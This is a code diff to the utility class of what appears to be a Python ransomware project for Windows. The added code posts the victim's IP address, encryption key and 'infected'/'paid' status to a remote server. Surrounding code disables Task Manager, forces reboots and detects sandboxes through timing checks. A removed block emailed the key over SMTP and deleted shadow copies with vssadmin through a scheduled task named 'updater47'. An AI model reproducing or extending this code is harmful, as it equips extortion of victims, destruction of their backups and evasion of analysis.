@@ -1,4 +1,5 @@
 import os
+from re import I
 import sys
 import subprocess
 import oschmod
@@ -6,6 +7,10 @@ import win32api
 import ctypes
 import winreg
 import time
+import requests
+import socket
+from datetime import datetime
+import traceback
 
 
 class Utils:
@@ -98,10 +103,9 @@ class Utils:
         with open(full_path, 'rb') as file:
             return file.read()
 
-
+    # Duplicado en VirtualEnvironmentDetector
     def is_windows(self):
         return os.name == 'nt'
-
 
     def get_local_drives(self):
         return win32api.GetLogicalDriveStrings().split('\000')[:-1]
@@ -195,12 +199,28 @@ class Utils:
             winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
             winreg.CloseKey(reg)
 
+    """
+    We must provide a JSON as the one it follows:
 
-    # TODO deprecated
-    def run_command(self, cmd):
-        completed = subprocess.run(
-            ["powershell", "-Command", cmd], capture_output=True)
-        return completed
+    {
+        'operation': 'insert'/'update'
+        'ip': ip_direction,
+        'key': encoded_key,
+        'date': datetime,
+        'state': 'infected'/'paid'
+    }
+    """
+    def send_post_request(self, url=None, mode='insert', key=None, state='infected'):
+        try:
+            ipaddr = str(socket.gethostbyname(socket.gethostname()))
+            if mode=='insert': 
+                date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                data = {'operation':mode, 'ip': ipaddr, 'key': str(key), 'date':date, 'state': state}
+            elif mode=='update':
+                data = {'operation':mode, 'ip': ipaddr, 'state': state}
+            requests.post(url, json=data)
+        except:
+            traceback.print_exc()
 
     def reboot(self):
         win32api.InitiateSystemShutdown()
@@ -222,57 +242,6 @@ class Utils:
             if (((t3-t2)/(t2-t1)) >= 10):
                 return True
         return False
-
-
-"""
-    def id_generator(self, size=12, chars=string.ascii_uppercase + string.digits)
-        return ''.join(random.choice(chars) for _ in range(size))
-    
-    def send_mail_message(self, key):
-        attack_id = self.id_generator()
-        
-        date = datetime.datetime.now()
-        date = date.strftime("%c")
-        
-        msg = MIMEMultipart("alternative")
-        msg["Subject"] = 'Key of attack with id ' + attack_id + ' at time ' + date
-        msg["From"] = self.SENDER
-        msg["To"] = self.RECEIVER
-
-        msg.attach(MIMEText('Download the file', 'plain'))
-        
-        attach_file_name = attack_id + '_key.key'
-        with open(attach_file_name, 'wb') as attach_file:
-            attach_file.write(key)
-        
-        payload = MIMEBase('application', 'octate-stream')
-        payload.set_payload((attach_file).read())
-        encoders.encode_base64(payload)  # encode the attachment
-
-        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
-        msg.attach(payload)
-
-        s = smtplib.SMTP(self.MAIL_SERVER, self.MAIL_PORT)
-        s.ehlo()
-        s.starttls()
-        s.login(self.SENDER, self.SENDER_PASSWORD)
-        s.sendmail(self.SENDER, self.RECEIVER, msg.as_string())
-        s.quit()
-        
-	
-	#Copypasted from https://github.com/sithis993/Crypter/blob/4b3148912dbe8f68c952b39f0c51c69513fe4af4/Crypter/Crypter/Crypter.py#L115
-	def delete_shadow_files(self):
-        '''
-        @summary: Create, run and delete a scheduled task to delete all file shadow copies from disk
-        '''
-
-        vs_deleter = ScheduledTask(
-            name="updater47",
-            command="vssadmin Delete Shadows /All /Quiet"
-        )
-        vs_deleter.run_now()
-        vs_deleter.cleanup()
-"""
 
 # LINKS HERE
 # https://www.youtube.com/watch?v=UoMzCyB2IvE
